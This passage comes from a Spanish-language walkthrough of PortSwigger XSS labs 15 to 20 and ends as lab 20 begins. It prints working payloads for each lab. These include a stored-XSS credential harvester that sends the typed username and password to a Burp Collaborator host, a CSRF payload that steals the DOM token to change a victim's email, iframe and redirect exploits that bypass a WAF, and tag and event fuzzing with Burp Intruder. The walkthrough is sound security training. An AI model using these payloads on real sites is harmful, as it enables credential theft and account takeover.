Vemos que podemos agregar un comentario, así que veremos si es vulnerable a XSS usando etiquetas:

![test](/assets/images/XSS/lab15/test.png)

Vemos que agregaremos el siguiente comentario usando las etiquetas HTML `<p></p>` para ver si se interpretan:

Al postear el comentario vemos lo siguiente:

![post](/assets/images/XSS/lab15/post.png)

Y vemos que no estan las etiquetas HTML, por lo que es vulnerable a XSS al parecer. 

Así que ahora el objetivo no es robar las cookies de sesión, si no obtener el usuario y contraseña del usuario que visita los comentarios después de ser publicados, por lo que usaremos el siguiente código:

```xml
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Que su funcionamiento es el siguiente:

En la primera linea crea un campo de entrada llamado **username**, y con el identificador único también llamado **username**, y lo que el usuario ingrese en este campo de entrada se guardará dentro de **name**.

En la segunda linea hace otro campo de entrada de tipo **password** que esto hace que los datos ingresados sean cubiertos con asteriscos, y este campo de entrada se llama password también.

Después dentro de el input de password usa **onchange**, que esto se encarga de que cuando haya un cambio en este caso en la entrada de datos de password, lo que hará **onchange** es encargarse de ejecutar algo cada vez que haya un cambio en esa sección indicada, y eso que va a ejecutar es el código que le sigue, y este código es el siguiente:

`if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN'`

Esto va a verificar si en el valor de contraseña hay datos, como seguimos dentro del input de **password** entonces podemos usar **this.value**, para acceder al valor que el usuario ha proporcionado en la entrada de datos de password.

Y en caso de que si haya datos dentro de **password** entonces se realizará una petición por **HTTP** usando la función **fetch()**, y la petición se envia hacía la URL controlada por el atacante, y esta petición se hace por el metodo **POST**, y el modo **no-cors** como recordamos es para desactivar las reglas de seguridad, y por último muestra el valor del usuario y la contraseña en el body de la respuesta de la petición, estas credenciales estan siendo llamadas para que sean visibles en el body, primero se usa **username.value** que como recordamos este es el identificador único del campo de entrada de datos del nombre de usuario. así que se estaría mostrando el nombre de usuario, después concatenamos dos puntos **:** esto para separar el usuario de la contraseña, y finalmente mostramos la contraseña que como recordamos seguimos dentro del input de **password** por lo que usamos **this.value** para mostrar el valor actual del campo donde el usuario ingreso datos en el campo de entrada de datos de password.

`});">`

Y por último cerramos la llave de la configuración de la petición, también cerramos el parentesis de la función fetch, usamos punto y coma para decir que hemos terminado eso, y por ultimo usamos las comillas dobles y el signo de mayor para cerrar el input de password.

<br>

Así que en resumen con esto crearemos 2 campos de entrada de datos, uno de usuario y otro de contraseña y al momento de que un usuario ingrese datos dentro de esto, entonces se enviará esta información hacia nuestro servidor tercero para poder leer las consultas con sus credenciales.

Así que primero iniciaremos el **BurpCollaborator** y copiaremos el host tercero por el cual recibiremos la respuesta de la petición que haremos en el XSS:

![copy](/assets/images/XSS/lab15/copy.png)

Una vez copiemos el host dando a **Copy to clipboard**, lo agregamos a el código como destino de URLy una vez listo nuestro código se verá algo así:

![payload](/assets/images/XSS/lab15/payload.png)

Y una vez publiquemos el comentario, iremos a revisar los registros del BurpCollaborator y veremos una petición **HTTP**:

![http](/assets/images/XSS/lab15/http.png)

La cual contiene las credenciales que ingreso el usuario que lee todos los comentarios y cayo en nuestra trampa obteniendo así sus credenciales en la respuesta como podemos ver: **administrator:iwqjmta4kvoxl1ac5882**.

La forma en que sucedio este ataque es que recordamos que creamos 2 campos de ingresar datos los cuales se agregaron a la web:

![campos](/assets/images/XSS/lab15/campos.png)

Dentro de esos campos si metemos datos, por ejemplo:

![prueba](/assets/images/XSS/lab15/prueba.png)

Y estos datos se envian automaticamente hacia nuestro servidor tercero:

![http2](/assets/images/XSS/lab15/http2.png)

Como podemos ver recibimos lo que ingresamos en esos campos de entrada, gracias a el XSS y las instrucciónes inyectadas.

Y al ingresar con las credenciales de la victima habremos terminado este laboratorio:

![end](/assets/images/XSS/lab15/end.png)

<br>

# Laboratorio 16: Exploiting XSS to perform CSRF

En este siguiente laboratorio vemos que nos dice lo siguiente:

![lab16](/assets/images/XSS/lab16/lab16.png)

Nos dice que en este laboratorio existe un XSS stored(almacenado), dentro de la sección de comentarios del blog, y que debemos aprovechar el XSS para realizar un ataque CSRF y cambiar la dirección de correo de un usuario victima, este usuario victima lee los comentarios como recordamos después de ser publicados.

Y después nos da un usuario desde donde atacaremos.

> El usuario y contraseña que nos dan es para desde ese usuario atacar, no se debe confundir con que a ese usuario es el que atacaremos.

Así que primero comprobamos que es vulnerable a XSS ya que usamos las etiquetas `<p></p>`:

![comentario](/assets/images/XSS/lab16/comentario.png)

Y podemos apreciar en la respuesta que existe un XSS:

![xss](/assets/images/XSS/lab16/xss.png)

Ya que nos esta interpretando el código que en este caso son las etiquetas y vemos que no se ven ya que han sido interpretadas por la web en el contexto de nuestro navegador.

<br>

Explorando la web encontré una sección para iniciar sesión llamada **My account**, usaremos las credenciales que nos da el laboratorio para iniciar sesión y tener una cuenta desde donde atacar y vemos lo siguiente:

![mail](/assets/images/XSS/lab16/mail.png)

Podemos ver que una vez ingresamos, podemos ver una función para cambiar el correo, cambiaremos nuestro correo para ver que es lo que sucede.

Pero antes de esto abriremos BurpSuite y ejecutaremos esta petición con el BurpSuite abierto en el navegador por el cual viaja el trafico de BurpSuite, no ocupamos tener el intercept encendido pero si usar el proxy para ir revisando los archivos que se van cargando y analizarlos.

Una vez dentro del navegador de BurpSuite cambiaremos el correo del usuario wiener que es nuestro usuario atacante, no la victima, lo cambiaremos a algo por ejemplo **dante@test.com**:

![nuevomail](/assets/images/XSS/lab16/nuevomail.png)

Vemos que hemos cambiado nuestro propio correo, esto lo hacemos para reconocer como trabaja la web y posteriormente intentar descubrir modos de atacar a el usuario victima.

Primero analizaremos la consulta que sucedio por detrás al cambiar el correo, nos dirigiremos a la pestaña **target** de BurpSuite:

![target](/assets/images/XSS/lab16/target.png)

Y podemos ver el registro de el servidor en el que estamos haciendo todo, así que en la lista desplegable buscaremos algo que nos relacione con el cambio de correo para ver lo que sucedio por detrás:

![recurso](/assets/images/XSS/lab16/recurso.png)

Encontramos en el registro algo llamado **change-email** lo cual al acceder veremos lo que se ve en la imagen, una petición por el metodo POST, haciá la ruta **/my-account/change-email** de la web.

Y vemos que en esta petición por POST se establecen 2 parametros, uno llamado **email** que será el nuevo correo electronico, y el otro llamado **csrf** que este es el que contiene el token csrf.

¿Que es un token csrf?

Basicamente un token csrf es una serie de digitos aleatorios los cuales se genera por cada sesión y para lo que sirven es para que se compruebe que eres tu el que quiere hacer algo dentro de la cuenta, en este caso cambiar el correo, estos token sirven para evitar ataques que hagan peticiones externas haciendo consultas hacia una web especifica, pero como existe el token csrf detecta que ese token no esta disponible o no es valido y no hace la petición.

Pero como nosotros si somos el usuario que quiere hacer el cambio entonces nos deja ya que proporciona el token correcto.

Pero de nada sirve tener esta seguridad si no se usa bien como lo es en este caso.

Ya que al revisar el código de la web como vimos anteriormente se puede ver el **token csrf** y como tenemos un XSS en esta web entonces podemos inyectar código javascript y como javascript tiene acceso al DOM, y en el DOM es donde se encuentra el token, esto es potencialmente peligroso.

Ya que buscando en esta web, nos dimos cuenta que al entrar a la sección de comentarios de un post, en el código de la web podemos apreciar lo siguiente:

![post](/assets/images/XSS/lab16/post.png)

Podemos ver que en el post con el id 6 al que accedimos, podemos encontrar en su código una sección de comentarios, la cual vemos que esta el **token csrf**, así que nuestro token csrf es visible en el código de esta sección.

Recordemos que para cambiar el correo de alguien ocupamos su token y que interprete nuestro comentario vulnerable que veremos más adelante.

Así que ahora que sabemos que el token se encuentra en el DOM de todos los usuarios ya que la página web es la misma para todos con las mismas configuraciones, entonces podemos crear un payload para que obtengamos el token de un usuario y cambiar su correo para tener acceso.

Primero para filtrar el csrf del DOM, necesitamos ver que donde se almacena este token tiene un nombre llamado **csrf**, por lo que usando en la consola de inspeccionar elemento, usamos la siguiente linea de código:

```js
document.getElementsByName('csrf')[0].value;
```

![token](/assets/images/XSS/lab16/token.png)


Y comprobamos que si podemos filtrar el token, y lo que hace este código simplemente es que primero con **document.getElementsByName** obtenemos el elemento por nombre el cual es **csrf** como vimos en el código de la web, y simplemente estamos tomando su primer valor **[0]** que es el token y lo mostramos con **.value**.

<br>

Así que ya sabemos como filtrar el token, por lo que ahora usaremos esto no para saber el token de los usuarios, ya que podemos referenciar al token dentro de nuestro código malicioso javascript que inyectaremos en el XSS, y que haga algo con todos los tokens de los usuarios que abran este post con el comentario malicioso.

El objetivo es cambiar el correo de un usuario que no sabemos cual es pero que siempre entra a ver los comentarios de ser publicados, así que construiremos el siguiente payload:

```js
<script>

window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;

var data = new FormData();
data.append('csrf', token)
data.append('email', 'dansh@dm.com');

fetch('/my-account/change-email', {
method: 'POST',
mode: 'no-cors',
body: data
});
});

</script>
```

Lo que hace este código es que primero crea un evento para esperar que se cargue la página por completo, una vez se cargue, ejecutará la función la cual lo que hará es crear una variable llamada **token**, el contenido de **token** es el valor del elemento con el nombre "csrf", guardamos su primer valor como lo vimos anteriormente esta linea explicada para entender esto, después creamos otra variable llamada **data** que esto es un formulario para realizar una petición.

A esta petición le pasaremos 2 parametros ya que como explique al principio vimos que recibe 2 parametros la ruta a la que haremos la petición la cual es **/my-account/change-email**, primero declaramos los valores de los parametros con **data.append** y que el parametro **csrf** tendrá el valor del token obtenido anteriormente que se guardo en la variable token, y en el segundo parametro le decimos que el valor de **email** será igual a un nuevo email por el que queremos que la victima cambie su correo, en este caso el correo de la victima será cambiado por "dansh@dm.com".

Por último usando la función **fetch()**, haremos la petición, esta se hará en la ruta **/my-account/change-email** como dije anteriormente de la web actual, ya que como recordamos en la prueba donde cambiamos nuestro propio correo para ver el funcionamiento vimos que nos llevo a esta ruta para hacer los cambios con los paramteros. después configuramos la petición diciendo que se tramite por el metodó **POST**, en modo **no-cors**, y por último se especifica que el body de la solicitud **HTTP** será el objeto FormData creado anteriormente.

<br>

Así que una vez entendamos el payload, toca dejarlo en la sección de comentarios y esperar que la victima caiga:

![payload](/assets/images/XSS/lab16/payload.png)

Y una vez lo dejemos vemos que hemos completado el nivel ya que el correo de la victima ha sido cambiado correctamente, y el peligro de esto fue aparte del XSS que el token csrf estaba expuesto en el DOM al que pudimos referenciar para hacer tareas maliciosas como estas, y para evitar esto es importante revisar la seguridad de la web sobre los XSS y tokens en este caso, así que ahora terminamos este laboratorio:

![end](/assets/images/XSS/lab16/end.png)

<br>

# Laboratorio 17: Reflected XSS into HTML context with most tags and attributes blocked

En este laboratorio nos piden realizar lo siguiente:

![lab17](/assets/images/XSS/lab17/lab17.png)

Primero nos dice que este laboratorio contiene una vulnerabilidad XSS reflected(reflejada) en la función de busqueda de la página web, pero que usa un WAF lo cual es un firewall web, para protejer la página de ataques XSS.

Y que para terminar el laboratorio debemos evadir el WAF y llamar a la función **print()**, y dice que debemos enviar el ataque a un usuario pero sin la interacción de este usuario, que sea algo forzado con solo abrir lo que le enviemos.

<br>

Así que al acceder al laboratorio veremos lo siguiente:

![blog](/assets/images/XSS/lab17/blog.png)

Primero como sabemos que hay un XSS en la función de busqueda intentaremos inyectar algo simple como lo que ya hemos hecho antes:

`<img src=noexiste onerror=print()>`

Al enviar esto como busqueda nos muestra lo siguiente:

![waf](/assets/images/XSS/lab17/waf.png)

vemos que nos da un mensaje que dice "Tag is not allowed", por lo que el WAF esta bloqueando la petición ya que ha detectado que se estan inyectando etiquetas, pero si enviamos solo:

`<prueba>`

Podemos apreciar lo siguiente:

![etiqueta](/assets/images/XSS/lab17/etiqueta.png)

Podemos apreciar que no esta filtrando las etiquetas `<>`, por lo que ya es algo raro, así que ahora iremos a BurpSuite, una vez tengamos el proxy activado de burp con el navegador, enviaremos una petición como la anterior, y luego en el **Target** de burpsuite veremos la petición hecha:

![target](/assets/images/XSS/lab17/target.png)

Podemos ver que esta nuestra petición y podemos ver que se esta url-encodeando automaticamente, ya que vemos los valores "<" y ">" en sus valores de url-encode.

lo que haremos ahora será enviar esta petición al **intruder** de BurpSuite con Ctrl + i, una vez estemos en el intruder damos a clear y veremos algo así:

![intruder](/assets/images/XSS/lab17/intruder.png)

Y lo que haremos será poner los valores de los simbolos `<>`, y en medio de ellos eliminamos el texto de prueba, agregaremos la posición del payload dando a el botón **add** 2 veces, para abrir y cerrar donde se va a fuzzear la petición, ahora veremos para que hacemos esto, nos quedará así:

![payload](/assets/images/XSS/lab17/payload.png)

Lo que pasará aquí es que lo que haremos será un ataque de tipo sniper el cual nos permitirá hacer fuzzing sobre esta petición, nuestro objetivo es fuzzear todas las etiquetas posibles y en base al estado de la respuesta saber cuales estan bloqueadas por el WAF y cuales no, así que primero iremos a la web donde se encuentran estas etiquetas la cuál nos la dan en el mismo laboratorio: [XSS-CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

![tags](/assets/images/XSS/lab17/tags.png)

Podemos apreciar que nos dan una lista de todas las etiquetas, las copiaremos al portapapeles dando al botón **Copy tags to clipoard**, y ahora volvemos a burpsuite en el intruder, y vamos a la pestaña **payloads**:

![paste](/assets/images/XSS/lab17/paste.png)

Y daremos click en paste para pegar todas las etiquetas, y una vez ya pegadas, daremos click en **start attack**:

![start](/assets/images/XSS/lab17/start.png)

Y lo que hará esto es empezar a hacer peticiones con cada etiqueta que asignamos y se probaran dentro de los `<>` de la petición.

Una vez termine el ataque veremos lo siguiente:

![status](/assets/images/XSS/lab17/status.png)

Daremos click en **status** para filtrar por las peticiónes con estado de 200 primero:

![200](/assets/images/XSS/lab17/200.png)

Así que ya sabemos que la etiqueta `<body>` y `<custom tags>` no se están filtrando, la que nos llama la atención es la de **body** así que ahora fuzzearemos eventos de esta etiqueta para ver cuales tenemos acceso, es algo similar de nuevo.

Ahora en el mismo payload borraremos lo anterior y ahora lo cambiamos por:

`<body%20§§=1>`

![payload2](/assets/images/XSS/lab17/payload2.png)

Esto es simplemente esto: `<body §§=1>` solo que el espacio lo url-encodeamos para evitar errores, después le decimos que algo tendrá el valor de uno, esto lo haremos para saber si el evento actual que se esta fuzzeando es valido y no lo filtra el WAF, ya que como recordamos esos valores §§ indican donde empiza y termina lo que queremos fuzzear en la petición web.

Ahora vamos a la pestaña de **payloads**, y aquí es donde pegaremos los eventos que copiaremos de la misma web que nos dan pero ahora copiaremos los eventos:

![events](/assets/images/XSS/lab17/events.png)

Copiamos los eventos y los pegamos donde ya sabemos:

![start2](/assets/images/XSS/lab17/start2.png)

Ahora damos en **start attack** y esperaremos a que haga las peticiónes con cada evento, una vez terminado filtraremos por el estado de respuesta:

![5](/assets/images/XSS/lab17/5.png)

Podemos apreciar que hay 5 eventos disponibles para la etiqueta **body**.

**onbeforeinput**: Este evento sucede cuando el usuario esta a punto de meter datos de entrada en algun lugar de la web.

**onratechange**: Este sucede al cambiar la velocidad de reproducción de un video.

**onresize**: Este evento sucede es cuando la web cambia de tamaño.

**onscrollend**: Y este evento sucede cuando llegas hasta el final de un elemento en la web.

El que más llama la atención es el de **onresize** ya que requiere una minima interacción pero podemos forzarla y ahora veremos como.

<br>

Primero ejecutaremos:

`<body onresize=print()>`

Con interacción del usuario, probaremos nosotros mismos esto en la función de busqueda, y al ejecutarlo nos aparecerá lo siguiente:

![interaccion](/assets/images/XSS/lab17/interaccion.png)

Ahora no nos ha saltado el mensaje de error ya que vemos que si usamos la etiqueta **body** podemos hacer uso del evento **onresize** que lo que hace esto es que ejecutará algo al momento de que el usuario cambie el tamaño del navegador.

Así que si lo cambiamos:

![print](/assets/images/XSS/lab17/print.png)

Podemos ver que se ha ejecutado la función **print()**!

Así que ha funcionado, pero el objetivo es entregarle algo al usuario que cuando lo abra se fuerze esto sin su interacción.

En el laboratorio nos dan una botón para acceder a una web de un servidor donde podemos crear nuestro exploit que entregaremos al usuario, más adelante veremos como funciona mejor.

Al entrar a la web donde crearemos el exploit:

![exploit](/assets/images/XSS/lab17/exploit.png)

Veremos lo siguiente:

![server](/assets/images/XSS/lab17/server.png)

Aquí podemos ver que es donde crearemos nuestro payload, para posteriormente lo que se programe aquí se interpretará en otro servidor web que al abrirlo ejecutará lo programado aquí.

Así que nuestro exploit es el siguiente:

`<iframe src="https://0ad0000104929c8280a558bc003f009c.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'>`

La web tercera contendrá este código que hemos creado y lo interpretará a quien lo abra, entonces primero usa un `<iframe>` que lo que hace esto es cargar una web dentro de la web tercera, la web tercera es lo que ya esta interpretando lo que programamos como dije anteriormente, así que llamamos a la web la cual en este caso es la web del laboratorio, junto con el parametro **search** y su valor el cual es lo que vimos anteriormente que lo que hace es llamar a la función **print()** cuando se cambie de tamaño la página aprovechandonos de que body y su atributo onresize no se filtran por el WAF, Cuando esta web se termine de cargar dentro de nuestra web tercera, entonces lo que hará es ejecutar la parte de **onload** que esto ejecuta algo cuando la página web anterior ya se cargo por completo, entonces forzamos a que el navegador cambie de tamaño haciendo que se ejecute la vulnerabilidad XSS dentro de la web que hemos llamado y cargado lo que hará que llame a la función print.

Pero obviamente dentro del valor del source **src**, deben estar los valores url-encodeados ya que se trata de una URL, así que URL-encodearemos los valores que estan dentro del src, así que nuestro exploit final ya url-encodeado quedaría así:

![urc](/assets/images/XSS/lab17/urlencodeonline.png)

> Usamos una web para URL encodear el exploit que necesitaremos.

`<iframe src="https://0ad0000104929c8280a558bc003f009c.web-security-academy.net/?search=%3Cbody%20onresize%3Dprint%28%29%3E" onload=this.style.width='100px'>`

Puede ser confuso, pero usamos **iframe** en el servidor tercero, como el servidor tercero es nuestro y lo programamos como queremos entonces no hay un WAF, obviamente el WAF solo esta en la página del blog del laboratorio, entonces aquí en el servidor tercero podemos llamar a cualquier cosa, pero lo importante es que cuando carguemos la web del blog dentro del servidor tercero entonces ahí si se respeta lo del WAF por eso usamos lo del body y onresize, pero solo en la parte de la URL ya que la web que carga esta url esta libre de un WAF y por eso funciona, menciono esto ya que al inicio me confundi un poco con esto.

![deliver](/assets/images/XSS/lab17/deliver.png)

Damos en **Deliver exploit to victim**.

Y terminaremos el laboratorio.

![url3](/assets/images/XSS/lab17/url3.png)

Podemos ver que nos da una URL donde podemos simular que somos la victima y ver lo que le sucedería, este link es el del servidor tercero, el servidor tercero como sabemos contiene en su código lo que le indicamos anteriormente que hiciera, nuestras instrucciones del iframe para cargar la web vulnerable y forzar el cambio de tamaño y eso.

Así que al abrir esta URL veremos lo siguiente:

![victimfinal](/assets/images/XSS/lab17/victimfinal.png)

Podemos ver que nos llama a la función print apenas entramos al link sin hacer ninguna interacción más que abrir el link del servidor tercero.

Y si podemos apreciar en la esquina se ve la web del blog que cargo dentro de nuestro servidor tercero, cargo con un tamaño pequeño como lo indicamos para que se ejecute la parte del onresize y nos ejecute la función deseada.

En este caso print() no hace nada malo, pero podría ser algo verdaderamente grave si así lo quisieramos.

![end](/assets/images/XSS/lab17/end.png)

Podemos ver que en efecto la página del blog en la sección de busqueda que le indicamos por metodo GET que hiciera esta petición se pudo y logramos forzar la vulnerabilidad XSS a través de un servidor tercero.

Y habremos terminado:

![final](/assets/images/XSS/lab17/final.png)

<br>

# Laboratorio 18: Reflected XSS into HTML context with all tags blocked except custom ones

En este laboratorio vemos lo siguiente:

![lab18](/assets/images/XSS/lab18/lab18.png)

Este laboratorio contiene un WAF el cual nos bloquea todas las etiquetas, pero dice que las etiquetas personalizadas no son bloqueadas.

Y que debemos inyectar una etiqueta personalizada que llame a **document.cookie** para terminar el laboratorio y sabemos que la parte vulnerable a XSS esta en la función de busqueda.

<br>

Una etiqueta personalizada como su nombre lo dice es una etiqueta la cual nosotros definimos junto con su función.

Podemos ver que si intentamos meter alguna etiqueta HTML ya existente como `<body>` en el campo de busqueda del laboratorio:

![body](/assets/images/XSS/lab18/body.png)

Vemos que al tramitar esta petición nos muestra lo siguiente:

![waf](/assets/images/XSS/lab18/waf.png)

Vemos que el WAF nos bloquea la petición.

Pero si agregamos una etiqueta creada por nosotros por ejemplo `<xss>` veremos lo siguiente:

![xss](/assets/images/XSS/lab18/xss.png)

Podemos apreciar que las etiquetas personalizadas no las esta filtrando el WAF.

<br>

Sabemos que el objetivo del nivel es llamar a **document.cookie**, así que primero haremos una prueba que no es como debe hacerse pero sirve para entender como funcionan las etiquetas personalizadas y después mostraré la forma como se resuelve.

Primero en esta prueba de muestra, creamos la siguiente etiqueta HTML personalizada:

`<xss onmouseover=alert(document.cookie)>`

![search](/assets/images/XSS/lab18/search.png)

> No lo url-encodeamos ya que sabemos que el navegador lo hace automaticamente.

Lo que hace esta etiqueta que creamos llamada "xss", es que dentro de ella llamamos al evento **onmouseover** que lo que hace este evento es que cuando el usuario pasa el mouse por encima del elemento donde reside esta etiqueta que se inyecta, entonces se llamara a la función **alert()** la cuál llama a el valor **document.cookie**.

Sabemos que la etiqueta anterior se inyecta en esta sección de la web:

![reflected](/assets/images/XSS/lab18/reflected.png)

Ya que ahí es donde se refleja la entrada de datos interpretada, así que si pasamos el mouse por ahí:

![mouse](/assets/images/XSS/lab18/mouse.png)

Y vemos que al pasar el mouse por ahí nos ejecuta lo que hace el evento que inyectamos gracias a la etiqueta personalizada.

Y podemos revisar el código fuente y revisar que se inyecto nuestra etiqueta personalizada gracias a el XSS:

![inject](/assets/images/XSS/lab18/inject.png)

Esto no soluciona el laboratorio pero quería mostrar esto ya que hay muchas formas de hacer algo.

<br>

Como sabemos que debemos llamar a **document.cookie** pero sin la interacción del usuario más que abrir el link del servidor tercero que programamos.

Así que hemos construido el siguiente exploit:

`<xss id=x onfocus=alert(document.cookie) tabindex=1>`

Lo que hace este exploit que creamos para inyectarlo en la web es lo siguienete:

Primero crea una etiqueta personalizada llamada "xss", la cuál contiene un identificador único con el valor de "x", después llama a el atributo de eventos **onfocus** que lo que hace es que al recibir el enfoque (cuando se selecciona o activa un campo de entrada de datos en la web) mediante la tecla tabulador o ya sea que se haga click sobre el elemento, entonces lo que sucederá es que se ejecutará lo que contiene que en este caso es llamar a la función **alert()** mostrando la cookie, y por último establece que posición de tabulación será para llegar a el.

Entonces al inyectar esto lo que veremos es esto:

![index](/assets/images/XSS/lab18/index.png)

No vemos nada en el lugar donde se refleja el campo de busqueda pero sabemos que es porque se ha interpretado por el navegador, entonces si pulsamos tab, veremos lo siguiente:

![tab](/assets/images/XSS/lab18/tab.png)

Y vemos que se llama a la función que contiene el **onfocus** que en este caso es mostrar la alerta de document.cookie, obviamente no se ve nada ya que como es prueba en laboratorio no hay cookies.

<br>

Así que ya tenemos una manerá pero aún se sigue requiriendo la interacción del usuario ya que el usuario tendría que pulsar tab o hacer click sobre el elemento y es dificil que lo haga ya que normalmente no se suele usar eso.

Pero para ello vamos a forzar que suceda esto al momento de abrir el link del servidor tercero.

Primero convertimos esto que hemos creado en formato url-encode ya que lo necesitaremos para programar el exploit del servidor web tercero.

Así que el exploit anterior url-encodeado queda así:

`%3Cxss%20id%3Dx%20onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E`

Y ahora vamos a el exploit server donde programaremos la web tercera a la que la victima ingresará:

![expserv](/assets/images/XSS/lab18/exploitserver.png)

Una vez dentro de donde vamos a programar la web tercera veremos lo siguiente:

![craft](/assets/images/XSS/lab18/craft.png)

Podemos ver que tenemos abajo para programar la web tercerá, así que nuestro exploit es el siguiente:

```js
<script>

location = 'https://0a5d009a037f3c2387533a0f00dd00b6.web-security-academy.net/?search=%3Cxss%20id%3Dx%20onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E/#x'

</script>

```
![red](/assets/images/XSS/lab18/redirect.png)


Lo que programamos en el servidor web tercero es que primero usamos las etiquetas de script para indicar que el código será javascript ya que usaremos **location** que requiere de javscript, y usamos **location** para que reemplazemos la dirección de URL cuando la victima abra el servidor tercero y sea redirigido a esta URL, la cúal es la  del blog yendo a la sección de busqueda y inyectando el XSS el cuál será forzado gracias a que como tiene un id para ser llamado y un tabindex, entonces vemos que al final de la URL ponemos **/#x** esto es para que el navegador se dirija hacia ese elemento en especifico, el cual x es el valor del id del elemento al que debe enfocarse la victima entonces de esta forma usando el hashtag si recordamos de laboratorios anteriores sabemos que el hashtag te redirige hacía un elemento en especifico dependiendo cual le indiques y como aquí se esta forzando que vaya a esa sección la cuál es donde se acontece el XSS entonces sucederá y con solo la victima abrir el link del servidor tercero el cual es el siguiente:

![tercero](/assets/images/XSS/lab18/tercero.png)

Lo que sucederá es que al abrirlo pasará lo anterior mencionado, y habremos cumplido con el objetivo de este laboratorio.

![end](/assets/images/XSS/lab18/end.png)

<br>

# Laboratorio 19: Reflected XSS with some SVG markup allowed

En este siguiente laboratorio vemos lo siguiente:

![lab19](/assets/images/XSS/lab19/lab19.png)

Nos dice que este laboratorio contiene una vulnerabilidad XSS reflected(reflejada) en la función de busqueda, y que el WAF bloquea todas las etiquetas comunes pero no filtra las que son `<svg>` ni sus eventos, y que debemos aprovechar esto para llamar a la función **alert()** y terminar el laboratorio.

<br>

Primero vemos que al meter un ataque XSS común en la función de busqueda como:

`<img src=noexiste onerror=alert()>`

Nos responde con lo siguiente:

![waf](/assets/images/XSS/lab19/waf.png)

Pero si usamos solo esto como entrada de datos:

`<>`

Vemos que nos responde:

![tags](/assets/images/XSS/lab19/tags.png)

Podemos ver que no nos esta bloqueando la entrada de estos simbolos, por lo que esto nos permite hacer un ataque de fuerza bruta para ir descubriendo que etiquetas estan habilitadas.

Así que no podemos usar las etiquetas comunes, por lo que usaremos BurpSuite para fuzzear todas las etiquetas y ver cuales estan disponibles.

Así que primero abriremos el laboratorio desde el navegador de BurpSuite o configurado con el proxy en tu navegador.

Una vez tengamos la Web lista en el proxy, entonces abrimos el laboratorio y haremos la petición anterior, una vez la veamos en el **Target**:

![peticion](/assets/images/XSS/lab19/peticion.png)

Y lo que haremos ahora es enviarla a el **intruder** para iniciar con el ataque de fuzzing, la mandamos con ctrl + i, y una vez en el intruder veremos lo siguiente:

![intruder](/assets/images/XSS/lab19/intruder.png)

Y damos al botón de **clear** para eliminar lo que nos marca por defecto, ahora lo que haremos será cambiar el valor del parametro de busqueda, vemos que esta en url-encode pero en este caso los dejaremos normales manualmente como `<>` quedando así:

![noencode](/assets/images/XSS/lab19/noencode.png)

Ahora dentro de esto meteremos 2 valores que es el rango donde se va a fuzzear, queremos que se fuzze dentro de eso por lo que damos 2 veces al botón de **add**, una para abrir y otra para cerrar donde se va a fuzzear la petición quedandonos así:

![fuzz](/assets/images/XSS/lab19/fuzz.png)

Dejamos el ataque como esta de tipo sniper, y ahora lo que haremos será ir a la pestaña de **payloads** dentro del intruder, y veremos lo siguiente:

![option](/assets/images/XSS/lab19/option.png)

Ahora lo que haremos es ir a la web del cheat sheet que nos da el laboratorio para copiar todas las etiquetas [XSS-CheatSheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) y una vez estemos en la página copiaremos todas las etiquetas:

![copytags](/assets/images/XSS/lab19/copytags.png)

Una vez las tengamos copiadas dandole al botón señalado, volvemos a BurpSuite y daremos aquí para pegar todas las etiquetas en lista:

![pastetags](/assets/images/XSS/lab19/pastetags.png)

Una vez hecho esto daremos en **startattack** y esperaremos a que se complete, filtrando por estado de respuesta vemos lo siguiente al terminar:

![tres](/assets/images/XSS/lab19/tres.png)

Podemos apreciar que hay 4 etiquetas las cuales forman parte de svg, la primera nos llama más la atención ya que con el resto no creo que podamos hacer mucho.

Así que ahora intentaremos descubrir que eventos tiene habilitados la etiqueta **animatetransform**.

<br>

Volvemos al intruder en la primera pestaña para modificar el ataque de fuzzing porque ahora queremos descubrir que eventos tiene habilitados con fuzzing, nos quedará así:

`<svg><animatetransform%20§§=1>`

![payload2](/assets/images/XSS/lab19/payload2.png)

Primero abrimos la etiqueta **svg** para poder usar la etiqueta siguiente, la cuál es **animatetransform**.

Después ponemos un espacio en URL-encode, y por último ponemos que el valor que se fuzzeará es 1, esto es simplemente para verificar que nos devuelva una respuesta **true** y si la da quiere decir que el evento fuzzeado esta disponible.

Ahora agregaremos la lista para fuzzear los eventos, para ello vamos a la pestaña de **payloads**, seleccionamos las anteriores y damos en **clear**:

![clear](/assets/images/XSS/lab19/clear.png)

Esto para eliminar los elementos de fuzzing anteriores usados, y ahora vamos a copiar los eventos de la misma web que copiamos las etiquetas:

![copyevents](/assets/images/XSS/lab19/copyevents.png)

Y ahora los pegaremos en la pestaña de payloads del intruder de burpsuite:

![pasteevents](/assets/images/XSS/lab19/pasteevents.png)

Una vez los peguemos, damos en **startattack**, y al terminar veremos cuales eventos estan disponibles, como recordamos filtraremos por el estado de respuesta:

![onbegin](/assets/images/XSS/lab19/onbegin.png)

Apreciamos que solo hay un evento que podemos usar, se llama **onbegin**.

Por lo que buscando su funcionamiento encontramos lo siguiente:

![data](/assets/images/XSS/lab19/data.png)

Así que vemos que nos dice que los que inician con "on" tienden a tener una función especificada que ejecutará cuando son llamados.

Como **onbegin** forma parte de esto, entonces creamos el siguiente exploit:

`<svg><animatetransform onbegin=alert()>`

Y al poner esto en el campo de busqueda del laboratorio:

![xss](/assets/images/XSS/lab19/xss.png)

Podemos ver que ha funcionado y hemos podido llamar a la función alert() gracias al uso de etiquetas y el atributo SVG.

Y podemos ver que se inyecto nuestro exploit de forma reflejada:

![inject](/assets/images/XSS/lab19/inject.png)

Y habremos terminado con el objetivo de este laboratorio:

![end](/assets/images/XSS/lab19/end.png)

<br>

# Laboratorio 20: Reflected XSS in canonical link tag

![lab20](/assets/images/XSS/lab20/lab20.png)

Nos dice que este laboratorio en el enlace refleja la entrada del usuario en el enlace canónico.

Un enlace canonico es una URL que se indica para saber que la web sepa cual es la URL principal, esto se usa para no mostrar contenido duplicado en una web, por ejemplo el siguiente es un enlace canónico:

